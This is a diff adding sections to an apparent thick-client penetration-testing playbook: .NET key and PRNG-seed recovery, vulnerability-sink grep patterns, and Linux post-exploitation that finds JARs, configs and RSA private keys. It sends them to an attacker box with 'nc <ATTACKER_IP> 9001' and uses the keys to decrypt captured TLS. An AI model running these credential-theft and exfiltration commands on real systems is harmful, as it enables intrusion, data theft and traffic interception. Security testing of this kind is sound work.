@@ -377,6 +377,131 @@ ilspycmd <APP_PATH>.exe -r resources\
 grep -riE 'Bearer |X-Api-Key|password|connectionString|server=.*;uid=' decomp\
 ```
 
+### 4.3b Reversing Encryption Logic (Crypto Seed / Key Recovery)
+
+When a thick-client encrypts config, credentials, or comms with a derived key, reverse the key-derivation logic in the decompiled source, then recompile a decryptor or compute the key offline.
+
+```powershell
+# 1. Decompile and locate encryption classes
+ilspycmd <APP_PATH>.exe -p -o decomp\
+grep -riE 'System\.Random|RNGCryptoServiceProvider|Rfc2898DeriveBytes|CreateDecryptor|CreateEncryptor|ICryptoTransform' decomp\
+
+# 2. Identify seed source — common patterns:
+#    - System.Random seeded with fixed int / timestamp / file mtime
+#    - AES key derived from hardcoded passphrase via PBKDF2
+#    - XOR key = file creation time (FileInfo.CreationTime.Ticks)
+
+# 3. In dnSpyEx: navigate to the encryption method, note:
+#    - Algorithm (AES-CBC, DES, RC4, XOR)
+#    - Key derivation inputs (seed, salt, iterations)
+#    - IV source (static? first N bytes of ciphertext?)
+
+# 4. Build a decryptor — add CreateDecryptor call + write plaintext:
+# In dnSpyEx → Edit Method (C#) on Main() or add a new static method:
+#   byte[] key = DeriveKeyFromSeed(<SEED_VALUE>);
+#   byte[] iv  = new byte[16]; // or extract from ciphertext prefix
+#   using (Aes aes = Aes.Create()) {
+#       aes.Key = key; aes.IV = iv;
+#       ICryptoTransform dec = aes.CreateDecryptor();
+#       byte[] plain = dec.TransformFinalBlock(cipherBytes, 0, cipherBytes.Length);
+#       File.WriteAllBytes("decrypted.bin", plain);
+#   }
+# File → Save Module → run patched binary
+
+# 5. For System.Random seed recovery (predictable PRNG):
+# If seed = (int)(File.GetLastWriteTime(<PATH>).Ticks & 0xFFFFFFFF):
+#   Get-Item <PATH> | Select-Object LastWriteTime   # note the mtime
+#   # Compute seed in C#: (int)(new DateTime(<YEAR>,<MO>,<DAY>,<H>,<M>,<S>).Ticks & 0xFFFFFFFF)
+```
+
+#### Living-off-the-land / LOTL variant
+
+```powershell
+# PowerShell-native AES decryption when you've recovered key+IV from static analysis
+$key = [byte[]]@(<KEY_BYTES_COMMA_SEPARATED>)
+$iv  = [byte[]]@(<IV_BYTES_COMMA_SEPARATED>)
+$ct  = [System.IO.File]::ReadAllBytes("<CIPHERTEXT_FILE>")
+$aes = [System.Security.Cryptography.Aes]::Create()
+$aes.Key = $key; $aes.IV = $iv; $aes.Mode = 'CBC'; $aes.Padding = 'PKCS7'
+$dec = $aes.CreateDecryptor()
+$pt  = $dec.TransformFinalBlock($ct, 0, $ct.Length)
+[System.IO.File]::WriteAllBytes("decrypted.bin", $pt)
+
+# System.Random seed brute-force (when seed space is small, e.g., 86400 seconds in a day)
+1..<SEED_RANGE> | ForEach-Object {
+    $rng = [System.Random]::new($_)
+    $candidate = [byte[]]::new(16)
+    for ($i=0; $i -lt 16; $i++) { $candidate[$i] = $rng.Next(256) }
+    # Compare first block decrypt against known plaintext header
+}
+```
+
+### 4.3c Sink-Hunting Grep Patterns (Vulnerability-Class Triage)
+
+After decompilation, grep for dangerous sinks to prioritize code paths worth deeper review. Each pattern maps to a vulnerability class exploitable from the thick-client's input surface.
+
+```bash
+# Run against ilspycmd output directory or dnSpyEx exported project
+DECOMP="<DECOMPILED_DIR>"
+
+# --- Deserialization (RCE if attacker controls serialized input) ---
+grep -rnE 'BinaryFormatter|ObjectStateFormatter|NetDataContractSerializer|SoapFormatter' "$DECOMP"
+grep -rnE 'XmlSerializer|DataContractSerializer' "$DECOMP"
+grep -rnE 'TypeNameHandling\s*[=:]\s*(All|Auto|Objects|Arrays)' "$DECOMP"   # Json.NET unsafe deserialization
+grep -rnE 'JavaScriptSerializer.*SimpleTypeResolver' "$DECOMP"
+
+# --- Code execution / command injection ---
+grep -rnE 'Process\.Start|ProcessStartInfo|cmd\.exe|powershell' "$DECOMP"
+grep -rnE 'AddScript\(|Invoke-Expression|iex |Invoke\(' "$DECOMP"          # PowerShell runspace injection
+grep -rnE 'Assembly\.Load|Assembly\.LoadFrom|Activator\.CreateInstance' "$DECOMP"
+
+# --- SQL injection (parameterized vs concatenated) ---
+grep -rnE 'SqlCommand|OleDbCommand|OdbcCommand' "$DECOMP" | grep -v 'Parameters\.Add'
+grep -rnE '"\s*\+.*SELECT|"\s*\+.*INSERT|"\s*\+.*UPDATE|"\s*\+.*DELETE' "$DECOMP"
+grep -rnE 'String\.Format.*SELECT|String\.Format.*INSERT' "$DECOMP"
+
+# --- File path injection / arbitrary file read-write ---
+grep -rnE 'File\.ReadAllText|File\.WriteAllText|File\.Copy|File\.Move|StreamReader|StreamWriter' "$DECOMP"
+grep -rnE 'Path\.Combine\(' "$DECOMP" | grep -v 'Path\.GetFileName'        # no sanitization
+
+# --- LDAP injection ---
+grep -rnE 'DirectorySearcher|DirectoryEntry|SearchFilter' "$DECOMP"
+
+# --- WCF / remoting attack surface ---
+grep -rnE 'ServiceContract|OperationContract|DataContract' "$DECOMP"        # WCF endpoints
+grep -rnE 'RemotingConfiguration|TcpChannel|HttpChannel|IpcChannel' "$DECOMP"
+
+# --- Crypto weaknesses ---
+grep -rnE 'DESCryptoServiceProvider|RC2|TripleDES|MD5\.Create|SHA1\.Create' "$DECOMP"
+grep -rnE 'RijndaelManaged.*ECB|AesManaged.*ECB|CipherMode\.ECB' "$DECOMP"
+grep -rnE 'new Random\(' "$DECOMP"                                          # predictable PRNG for crypto
+```
+
+#### Living-off-the-land / LOTL variant
+
+```powershell
+# PowerShell-native grep when grep/findstr is all you have (no ilspycmd available)
+# Use .NET reflection to dump method bodies as IL tokens — then pattern-match on type refs
+$asm = [System.Reflection.Assembly]::LoadFile("$(Resolve-Path <APP_PATH>.exe)")
+$asm.GetTypes() | ForEach-Object {
+    $_.GetMethods() | ForEach-Object {
+        $body = $_.GetMethodBody()
+        if ($body) {
+            $il = [System.BitConverter]::ToString($body.GetILAsByteArray())
+            # Check for known metadata tokens of dangerous types (fragile but works offline)
+        }
+    }
+}
+
+# Simpler: export strings and grep with Select-String (works on raw PE without decompiler)
+[System.IO.File]::ReadAllText("<APP_PATH>.exe", [System.Text.Encoding]::UTF8) -split '\x00' |
+    Where-Object { $_ -match 'BinaryFormatter|TypeNameHandling|Process\.Start|SqlCommand|ServiceContract' } |
+    Select-Object -Unique
+
+# findstr on Windows (no PowerShell needed)
+findstr /s /i /r "BinaryFormatter TypeNameHandling Process.Start SqlCommand ServiceContract" <DECOMPILED_DIR>\*.cs
+```
+
 ### 4.4 Auth / License Method Patch
 ```text
 1. In dnSpyEx, find the gate (e.g. CheckLicense() / IsAuthenticated() / IsAdmin()).
@@ -460,6 +585,74 @@ grep -riE 'Bearer |api[_-]?key|password|secret|jdbc:|https?://|aws_secret_access
 
 # Application config files
 find <APP_PATH>_unpacked/ -name '*.properties' -o -name '*.xml' -o -name '*.yml' -o -name '*.json' | xargs grep -lE 'password|secret|token' 2>/dev/null
+```
+
+### 5.3b Linux Post-Exploitation JAR Discovery and Exfil
+
+On a Linux foothold, server-side Java apps store JARs, WARs, and config with embedded credentials. Discover, triage, and exfil for offline decompilation on your attacker box.
+
+```bash
+# --- Discovery: find all JAR/WAR/EAR files ---
+find / -type f \( -name '*.jar' -o -name '*.war' -o -name '*.ear' \) 2>/dev/null | tee /tmp/java_artifacts.txt
+
+# Prioritize app-specific over library jars
+grep -v '/jre/\|/jdk/\|/rt\.jar\|/charsets\.jar' /tmp/java_artifacts.txt > /tmp/app_jars.txt
+
+# --- Config files with credentials (Spring, Hibernate, Tomcat) ---
+find / -type f \( -name 'application.properties' -o -name 'application.yml' \
+    -o -name 'hibernate.cfg.xml' -o -name 'persistence.xml' \
+    -o -name 'context.xml' -o -name 'web.xml' -o -name 'server.xml' \) 2>/dev/null
+
+# Quick credential grep on discovered configs
+find / -path '*/WEB-INF/*' -type f 2>/dev/null | xargs grep -lE 'password|secret|jdbc:|datasource' 2>/dev/null
+
+# --- Extract credentials from Spring configs without exfil ---
+grep -rE 'spring\.datasource\.(password|username|url)|jdbc:' /opt/ /var/ /srv/ /home/ 2>/dev/null
+grep -rE 'aws\.secretKey|aws\.accessKey|api[._-]key' /opt/ /var/ /srv/ /home/ 2>/dev/null
+
+# --- Exfil target JARs to attacker box ---
+# Option 1: base64 encode for copy-paste (small files < 5MB)
+base64 -w0 <JAR_PATH> > /tmp/app.jar.b64
+# On attacker: base64 -d < app.jar.b64 > app.jar
+
+# Option 2: nc transfer
+# Attacker:  nc -lvnp 9001 > app.jar
+cat <JAR_PATH> | nc <ATTACKER_IP> 9001
+
+# Option 3: tar multiple files
+tar czf /tmp/java_loot.tar.gz -T /tmp/app_jars.txt 2>/dev/null
+# Then transfer via nc/scp/curl
+
+# --- Offline decompile on attacker box ---
+cfr <LOOTED_JAR> --outputdir loot_cfr/
+grep -riE 'password|secret|jdbc:|Bearer |api[_-]?key|getConnection' loot_cfr/
+
+# --- WAR-specific: unpack and review ---
+mkdir war_unpacked && unzip -q <WAR_PATH> -d war_unpacked/
+cat war_unpacked/WEB-INF/web.xml                      # servlet mappings, filter chains
+cat war_unpacked/META-INF/context.xml 2>/dev/null     # JNDI datasource creds
+find war_unpacked/WEB-INF/lib/ -name '*.jar' | head   # bundled dependencies
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure built-in tools (no cfr/jadx/jd-gui on target — decompile after exfil)
+# Unpack JAR with jar (if JRE installed) or unzip
+jar -xf <JAR_PATH> 2>/dev/null || unzip -q <JAR_PATH> -d jar_unpacked/
+
+# Grep .class files for embedded strings (readable ASCII survives compilation)
+strings jar_unpacked/**/*.class 2>/dev/null | grep -iE 'password|jdbc:|secret|http://'
+
+# Extract application.properties / YAML from inside JAR without full unpack
+unzip -p <JAR_PATH> BOOT-INF/classes/application.properties 2>/dev/null
+unzip -p <JAR_PATH> BOOT-INF/classes/application.yml 2>/dev/null
+unzip -p <JAR_PATH> application.properties 2>/dev/null
+
+# Find running Java processes and their classpaths (reveals loaded JARs)
+ps aux | grep '[j]ava'
+cat /proc/<PID>/cmdline | tr '\0' '\n' | grep -E '\.jar|classpath'
+ls -la /proc/<PID>/fd 2>/dev/null | grep '\.jar'     # open file descriptors pointing to JARs
 ```
 
 ### 5.4 Class-File Edit + Repackage (Recaf flow)
@@ -609,6 +802,82 @@ sudo tcpdump -i <IFACE> -w client.pcap host <BACKEND_IP>
 # Wireshark — TLS keylog file lets you decrypt if you control the client process
 SSLKEYLOGFILE=/tmp/sslkeys.log <APP_BIN>       # Chromium-based + many Node clients honor this
 # Wireshark → Edit → Preferences → Protocols → TLS → (Pre)-Master-Secret log filename = /tmp/sslkeys.log
+```
+
+### 7.3b TLS Decryption with Exfiltrated RSA Private Key
+
+When you recover a server's RSA private key (from filesystem loot, misconfigured backup, or memory dump), use it to passively decrypt captured TLS traffic. Only works with RSA key exchange (TLS_RSA_*) — NOT with (EC)DHE cipher suites (forward secrecy defeats this).
+
+```bash
+# --- Find RSA private keys on compromised host ---
+find / -type f \( -name '*.pem' -o -name '*.key' -o -name '*.p12' -o -name '*.pfx' \) 2>/dev/null
+find / -type f -exec grep -l 'BEGIN RSA PRIVATE KEY\|BEGIN PRIVATE KEY' {} \; 2>/dev/null
+# Common locations:
+#   /etc/ssl/private/        /etc/nginx/ssl/         /etc/apache2/ssl/
+#   /opt/*/conf/             /home/*/.ssl/           /etc/letsencrypt/live/
+
+# --- Verify key matches the certificate ---
+openssl x509 -noout -modulus -in <CERT_FILE> | md5sum
+openssl rsa  -noout -modulus -in <KEY_FILE>  | md5sum
+# If md5sums match → key belongs to that cert
+
+# --- Wireshark GUI: decrypt pcap with RSA key ---
+# Edit → Preferences → Protocols → TLS → RSA keys list → Edit:
+#   IP: <SERVER_IP>   Port: <PORT>   Protocol: http   Key File: <KEY_FILE>
+# Apply → traffic decrypts in-place if RSA key exchange was used
+
+# --- tshark CLI: decrypt and extract HTTP from pcap ---
+tshark -r <PCAP_FILE> \
+  -o "tls.keys_list:<SERVER_IP>,<PORT>,http,<KEY_FILE>" \
+  -Y "http" -T fields -e http.host -e http.request.uri -e http.response.code
+
+# Full decrypted stream export
+tshark -r <PCAP_FILE> \
+  -o "tls.keys_list:<SERVER_IP>,<PORT>,http,<KEY_FILE>" \
+  -Y "http" --export-objects "http,exported_objects/"
+
+# --- Check if cipher suite allows RSA key decryption ---
+tshark -r <PCAP_FILE> -Y "tls.handshake.type == 2" \
+  -T fields -e tls.handshake.ciphersuite
+# Cipher suites starting with TLS_RSA_* = decryptable with server key
+# TLS_ECDHE_* or TLS_DHE_* = forward secrecy, key alone won't decrypt (need SSLKEYLOGFILE)
+
+# --- Combined approach: SSLKEYLOGFILE for forward-secrecy suites ---
+# If you control the client process (thick-client you're testing):
+SSLKEYLOGFILE=/tmp/sslkeys.log <APP_BINARY>
+# Wireshark → Edit → Preferences → Protocols → TLS → (Pre)-Master-Secret log filename: /tmp/sslkeys.log
+# This works for ALL cipher suites including ECDHE
+
+# --- PKCS#12 / PFX key extraction (Windows IIS exports) ---
+openssl pkcs12 -in <PFX_FILE> -nocerts -nodes -out extracted_key.pem -passin pass:<PASSWORD>
+openssl pkcs12 -in <PFX_FILE> -clcerts -nokeys -out extracted_cert.pem -passin pass:<PASSWORD>
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# tcpdump capture + offline analysis (no Wireshark on target)
+tcpdump -i <IFACE> -w /tmp/capture.pcap host <TARGET_IP> and port 443
+
+# OpenSSL s_client to confirm cipher suite before investing time
+openssl s_client -connect <TARGET_IP>:<PORT> </dev/null 2>/dev/null | grep -E 'Cipher|Protocol'
+
+# If no tshark available, use openssl to test decryption feasibility
+openssl rsautl -decrypt -inkey <KEY_FILE> -in <ENCRYPTED_PREMASTER> -out premaster.bin 2>/dev/null && echo "Key works"
+
+# ssldump (lighter than tshark, often pre-installed on network appliances)
+ssldump -r <PCAP_FILE> -k <KEY_FILE> -d 2>/dev/null | grep -A5 'HTTP/'
+```
+
+```powershell
+# Windows LOTL: netsh trace + certutil for key extraction
+netsh trace start capture=yes tracefile=C:\tmp\capture.etl
+# ... exercise the app ...
+netsh trace stop
+# Convert ETL → pcap with etl2pcapng (Microsoft tool) then decrypt offline
+
+# Extract private key from Windows cert store (requires admin + key marked exportable)
+certutil -exportPFX -p "<EXPORT_PASSWORD>" My "<CERT_THUMBPRINT>" C:\tmp\exported.pfx
 ```
 
 ### 7.4 Auth-Header / Signing-Scheme Recovery
